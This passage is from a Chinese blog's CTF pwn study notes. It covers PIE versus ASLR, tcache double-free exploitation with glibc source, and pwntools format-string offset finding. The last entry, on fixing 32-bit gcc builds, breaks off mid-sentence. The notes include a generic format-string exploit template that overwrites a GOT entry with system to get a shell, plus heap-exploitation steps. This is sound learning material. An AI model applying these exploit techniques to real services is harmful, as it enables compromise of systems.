<h2 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h2><p><a href="https://blog.csdn.net/fjh1997/article/details/105434992">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>
</body></html>]]></content>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF文件下对于PIE保护和ASLR的重新认识</title>
    <url>/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<html><head></head><body><h3 id=""><a class="post-anchor" href="#"></a></h3><h3 id="ELF文件下对于PIE保护和ASLR的重新认识">ELF文件下对于PIE保护和ASLR的重新认识<a class="post-anchor" href="#ELF文件下对于PIE保护和ASLR的重新认识"></a></h3><h4 id="0）">0）<a class="post-anchor" href="#0）"></a></h4><p>​    复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。</p>
<h4 id="1）">1）<a class="post-anchor" href="#1）"></a></h4><p>​    如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。</p>
<p>ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。</p>
<p>也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。</p>
<p>在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。</p>
<p>这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。</p>
<p>PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。</p>
<p>​    然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。</p>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcahce学习</title>
    <url>/2021/08/17/Tcache%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<html><head></head><body><h2 id=""><a class="post-anchor" href="#"></a></h2><h1 id="Tcahce学习">Tcahce学习<a class="post-anchor" href="#Tcahce学习"></a></h1><h2 id="0）review">0）review<a class="post-anchor" href="#0）review"></a></h2><p>说是Tcache学习，实际上是lonelywolf的复现。</p>
<p>网上wp都是神仙写的，一点也不萌新友好。我都看不懂（）</p>
<p>打开题发现这个菜单题好常规。</p>
<p>但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。                                                                                                   具体的参考可以看<a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a>。但是在这道题里面充其量算一个trick而不是核心考点。</p>
<h2 id="1）漏洞点">1）漏洞点<a class="post-anchor" href="#1）漏洞点"></a></h2><pre><code class="c">unsigned __int64 delete()
{
  __int64 v1; // [rsp+0h] [rbp-18h]
  unsigned __int64 v2; // [rsp+8h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  __isoc99_scanf(&amp;number, &amp;v1);
  if ( !v1 &amp;&amp; buf )
    free(buf);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<p>漏洞点。经典uaf。</p>
<p>之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。</p>
<pre><code class="c">while ( 1 )
        {
          read(0, v0, 1uLL);
          if ( *v0 == '\n' )
            break;
          if ( ++v0 == v1 )
            return __readfsqword(0x28u) ^ v4;
        }
        *v0 = 0;
</code></pre>
<p>然后有一个比较怪的点就是这里的 <code> __readfsqword();</code>。很明显他是一个和读取有关的函数，但是ida根本点不进去。</p>
<p>后面我才知道这个函数是和canary保护有关。</p>
<p>根据微软官方文档<a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-160">…</a>这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。</p>
<p>但是好像说了和没说一样。</p>
<p>回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。<a href="https://toutiao.io/posts/o5yed8w/preview">Canary安全机制原理实战分析</a></p>
<p>![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png)</p>
<h2 id="2）漏洞利用">2）漏洞利用<a class="post-anchor" href="#2）漏洞利用"></a></h2><h3 id="1）Tcache-double-free">1）Tcache double free<a class="post-anchor" href="#1）Tcache-double-free"></a></h3><p>之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。</p>
<p>虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。</p>
<pre><code class="python">add(0,0x68)
free(0)
gdb.attach(p)
pause()
</code></pre>
<p>首先先分配再释放一下，看看这个题具体的内存分布有什么特点。</p>
<pre><code class="c#">pwndbg&gt; hea
Allocated chunk | PREV_INUSE
Addr: 0x55e9c994c000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x55e9c994c250
Size: 0x71
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x55e9c994c2c0
Size: 0x20d41

pwndbg&gt; bin
tcachebins
0x70 [  1]: 0x55e9c994c260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
</code></pre>
<p>之前一直不是很清楚</p>
<pre><code class="c">Allocated chunk | PREV_INUSE
Addr: 0x55e9c994c000
Size: 0x251
</code></pre>
<p>这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。</p>
<p>然后这边</p>
<pre><code class="c">0x70 [  1]: 0x55e9c994c260 ◂— 0x0 //说明0x70大小的Tcache里只有一个Tcache chunk，
</code></pre>
<pre><code>pwndbg&gt; x/300gx 0x562fcfd39000
0x562fcfd39000:    0x0000000000000000    0x0000000000000251
0x562fcfd39010:    0x0000010000000000    0x0000000000000000
0x562fcfd39020:    0x0000000000000000    0x0000000000000000
0x562fcfd39030:    0x0000000000000000    0x0000000000000000
0x562fcfd39040:    0x0000000000000000    0x0000000000000000
0x562fcfd39050:    0x0000000000000000    0x0000000000000000
0x562fcfd39060:    0x0000000000000000    0x0000000000000000
0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260
</code></pre>
<p>这是控制堆块的部分结构</p>
<p><code>0x562fcfd39010:    0x0000010000000000    0x0000000000000000</code>中，1说明只有一个Tcache。</p>
<p>T擦车堆块的首地址也记录在内。从<code>0x562fcfd39050</code>开始分别记录0x20到0x70的Tcache chunk的首地址，比如<code>0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260</code>,记录的就是0x70大小chunk的首地址。</p>
<blockquote>
<p>喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。</p>
</blockquote>
<pre><code>pwndbg&gt; x/20gx 0x56533012f250
0x56533012f250:    0x0000000000000000    0x0000000000000071
0x56533012f260:    0x0000000000000000    0x000056533012f010
</code></pre>
<p>我们到Tcache的地址中看一看，会发现<code>0x56533012f260:    0x0000000000000000    0x000056533012f010</code>处的<code>0x000056533012f010</code>，这是一个key值。</p>
<h4 id="2-29下Tcahce-double-free的检测">2.29下Tcahce double free的检测<a class="post-anchor" href="#2-29下Tcahce-double-free的检测"></a></h4><p>之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是</p>
<p>对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry)</p>
<pre><code class="c">typedef struct tcache_entry
{
  struct tcache_entry *next;  //链表指针，对应chunk中的fd字段
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;  //指向所属的tcache结构体，对应chunk中的bk字段
} tcache_entry;
</code></pre>
<p>也就是所谓的key对应的就是chunk的bk字段。</p>
<p>当chunk被free，放入Tcache链表时，操作如下。</p>
<pre><code class="c"> 
static __always_inline void
tcache_put(mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);
 
  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e-&gt;key = tcache;  //设置所属的tcache
 
  e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法
  tcache-&gt;entries[tc_idx] = e;  
 
  ++(tcache-&gt;counts[tc_idx]); //计数增加
}
</code></pre>
<p>然后进行free操作</p>
<pre><code class="c">    size_t tc_idx = csize2tidx(size);
    //只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查
    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)
    {
      /* Check to see if it's already in the tcache.  */
      tcache_entry *e = (tcache_entry *)chunk2mem(p);
 
      /*
        如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来
        如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free
      */
      if (__glibc_unlikely(e-&gt;key == tcache))//剪枝
      {
        tcache_entry *tmp;
        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);
        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)
          if (tmp == e)
            malloc_printerr("free(): double free detected in tcache 2");
      }
 
      if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //通过检查，放入tcahce中
      {
        tcache_put(p, tc_idx);
        return;
      }
    }
</code></pre>
<p>源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。</p>
<p>大致是</p>
<pre><code class="python">add(0,0x78)
free(0)
edit(0,b"aaaa")
free(0)
show(0)
</code></pre>
<p>再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。</p>
<p>然后我们需要构造出unsortedbin chunk、</p>
<p>但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。</p>
<p>那么有什么办法能构造出unsortedbin呢？<br>回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？</p>
<p>如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？</p>
<p>然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。</p>
<p>总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。</p>
<p>然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。</p>
<h4 id="调试">调试<a class="post-anchor" href="#调试"></a></h4><p>接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。</p>
<p>但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。</p>
<h3 id="Tcache-利用">Tcache 利用<a class="post-anchor" href="#Tcache-利用"></a></h3><p>不是学习不是学习不是学习，</p>
<p>例题是lctf2018的easyheap。</p>
<h4 id="漏洞点">漏洞点<a class="post-anchor" href="#漏洞点"></a></h4><p>一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。</p>
<p>然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。</p>
<pre><code class="c">unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2)
{
  signed int v3; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  if ( a2 )
  {
    while ( 1 )
    {
      read(0, &amp;a1[v3], 1uLL);
      if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] == 10 )
        break;
      ++v3;
    }
    a1[v3] = 0;
    a1[a2] = 0;//loophole
  }
  else
  {
    *a1 = 0;
  }
  return __readfsqword(0x28u) ^ v4;
}
</code></pre>
<p>然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。</p>
<p>在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。</p>
<p>包括ciscn lonelywolf也是利用到了这一点。</p>
<h4 id="参考">参考<a class="post-anchor" href="#参考"></a></h4><p><a href="https://blog.csdn.net/A951860555/article/details/116910945">2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分</a></p>
<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a></p>
<p><a href="https://www.bilibili.com/video/BV1Sy4y1W7h2">CISCN2021 lonelywolf</a></p>
</body></html>]]></content>
      <tags>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</title>
    <url>/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<html><head></head><body><p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>
<h3 id="1）32位偏移计算原理">1）32位偏移计算原理<a class="post-anchor" href="#1）32位偏移计算原理"></a></h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>
<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>
<p>​    原理也比较简单。x86架构下，格式化字符串时通过栈传递的。</p>
<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>
<p>​    举一个例子，源码来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞</a></p>
<pre><code class="c">//test1.c
#include&lt;stdio.h&gt;
void main() {
    printf("%s %d %s", "Hello World!", 233, "\n");
}
</code></pre>
<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>
<p>​    我们以32位编译。</p>
<pre><code class="bash">gcc -m32 test1.c -o test1
</code></pre>
<p>​    在main函数处下一个断点。然后执行到断点处。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" data-caption="截屏2021-10-28 下午11.35.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" alt="截屏2021-10-28 下午11.35.36"></a></p>
<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>
<p>部分我们可以看到，此时栈里已经有一个参数”\n”。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" data-caption="截屏2021-10-28 下午11.38.15" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" alt="截屏2021-10-28 下午11.38.15"></a>    </p>
<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" data-caption="截屏2021-10-28 下午11.40.00" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" alt="截屏2021-10-28 下午11.40.00"></a></p>
<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" data-caption="截屏2021-10-28 下午11.41.43" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" alt="截屏2021-10-28 下午11.41.43"></a></p>
<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>
<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>
<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>
<h3 id="2）64位偏移计算原理">2）64位偏移计算原理<a class="post-anchor" href="#2）64位偏移计算原理"></a></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>
<h3 id="3）-pwntools-fmtstr工具">3） pwntools_fmtstr工具<a class="post-anchor" href="#3）-pwntools-fmtstr工具"></a></h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>
<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>
<h5 id="例子">例子<a class="post-anchor" href="#例子"></a></h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>
<pre><code class="python">from pwn import *

elf = ELF('./')
r = process('./')
libc = ELF('/')

# 计算偏移量
def exec_fmt(payload):
    r.sendline(payload)
    info = r.recv()
    return info
  
auto = FmtStr(exec_fmt)
offset = auto.offset

# 获得 func 的 got 地址
func_got = elf.got['func']#func通常是一些例如printf或puts的函数
log.success("func_got =&gt; {}".format(hex(func_got)))

# 获得 func 的真实地址
payload = p32(func_got) + '%{}$s'.format(offset)
r.send(payload)
func_addr = u32(r.recv()[4:8])
log.success("func_addr =&gt; {}".format(hex(func_addr)))

# 获得 system 的真实地址
system_addr = func_addr - (libc.symbols['func'] - libc.symbols['system'])
log.success("system_addr =&gt; {}".format(hex(system_addr)))

payload = fmtstr_payload(offset, {func_got : system_addr})
r.send(payload)
r.send('/bin/sh')
r.recv()
r.interactive()
</code></pre>
<p>​    </p>
<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>
<h5 id="源码分析">源码分析<a class="post-anchor" href="#源码分析"></a></h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>
<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" data-caption="IMG_0352" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg" alt="IMG_0352"></a></p>
<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" data-caption="截屏2021-10-29 下午2.08.21" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png" alt="截屏2021-10-29 下午2.08.21"></a></p>
<p>​    然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>
<p>​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>
<p>​    方法的内容其实比较简单：</p>
<pre><code class="python">  def find_offset(self):
        marker = cyclic(20)#cyclic 20个字符
        for off in range(1,1000):#从1-1000，爆破偏移量
            leak = self.leak_stack(off, marker)
            leak = pack(leak)#leak = p(leak_stack)
            pad = cyclic_find(leak[:4])
            if pad &gt;= 0 and pad &lt; 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None
</code></pre>
<p>​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>
<pre><code class="python">    def leak_stack(self, offset, prefix=b""):
        payload = b"START%%%d$pEND" % offset
        leak = self.execute_fmt(prefix + payload)
        try:
            leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak
</code></pre>
<p>​    <code>cyclic</code>的代码也顺便放一放（</p>
<pre><code class="python">def cyclic_find(subseq, alphabet = None, n = None): 
  if n is None:
        n = context.cyclic_size

    if isinstance(subseq, six.integer_types):
        subseq = packing.pack(subseq, bytes=n)
    subseq = packing._need_bytes(subseq, 2, 0x80)

    if len(subseq) != n:
        log.warn_once("cyclic_find() expects %i-byte subsequences by default, you gave %r\n"
            "Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\n"
            "Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.",
            n, subseq, len(subseq), len(subseq))
        subseq = subseq[:n]

    if alphabet is None:
        alphabet = context.cyclic_alphabet
    alphabet = packing._need_bytes(alphabet, 2, 0x80)

    if any(c not in alphabet for c in subseq):
        return -1

    n = n or len(subseq)

    return _gen_find(subseq, de_bruijn(alphabet, n))
</code></pre>
<p>​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>
<p>​    </p>
<p>​        </p>
<h3 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h3><p>​    part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。</p>
<p>​    主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。</p>
<p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>
<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>
<h3 id="5）参考">5）参考<a class="post-anchor" href="#5）参考"></a></h3><p>​    <a href="https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>
<p>​    <a href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
<p>​    <a href="https://blog.csdn.net/qq_33976344/article/details/113503914">pwntools中fmtstr的使用</a></p>
<p>​    <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">3.1.1 格式化字符串漏洞</a></p>
<p>​    <a href="https://blog.csdn.net/CLHugh/article/details/75000104">Python中self用法详解</a></p>
</body></html>]]></content>
      <tags>
        <tag>format</tag>
      </tags>
  </entry>
  <entry>
    <title>解决gcc无法编译32位程序的问题</title>
    <url>/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>​    之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。</p>
<h3 id="2-过程">2)过程<a class="post-anchor" href="#2-过程"></a></h3><p>​    首先我们尝试编译32位程序，gcc报错：<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.29.31.png" data-caption="截屏2021-10-27 下午8.29.31" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.29.31.png" alt="截屏2021-10-27 下午8.29.31"></a></p>
<p>​    缺少头文件，实则是没有安装多架构gcc。</p>
<p>​    试图安装，失败，报错如下：<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.30.23.png" data-caption="截屏2021-10-27 下午8.30.23" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.30.23.png" alt="截屏2021-10-27 下午8.30.23"></a></p>
<p>​    这里有个坑了我好久的东西，就是这个报错</p>
<p>E: Unable to correct problems, you have held broken packages.</p>
<p>​    无法修正问题，你持有held broken的软件包。</p>
<p>​    我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。</p>
<p>​    但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。</p>
<p>​    但是通过<code>dpkg --get-selections | grep hold</code>指令查找held的软件包，并没有任何结果。</p>
<p>​    经过各种试错，找到了一个快速解决的方法。</p>
<pre><code class="bash">sudo aptitude install gcc-multilib
</code></pre>
<p><code> aptitude</code>与apt类似，也是包管理器。但是通过<code>aptitude</code>进行包管理，对于软件包依赖问题的处理更加细节。</p>
<p>​    下面是一些常用的命令</p>
<pre><code class="bash">aptitude update #更新可用的包列表
aptitude purge &lt;pkgname&gt; #删除包及其配置文件
aptitude search &lt;pkgname&gt; #搜索包
aptitude clean #删除下载的包文件
aptitude autoclean #删除过期的包文件
</code></pre>
<p><code> aptitude</code>执行起来和<code>apt</code>其实不太一样，比如    <code>sudo aptitude install gcc-multilib </code>这个命令其实执行起来长这样：</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8810.58.52.png" data-caption="截屏2021-10-27 下午10.58.52" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8810.58.52.png" alt="截屏2021-10-27 下午10.58.52"></a></p>
<p>​    然后<code>aptitude</code>会问你</p>
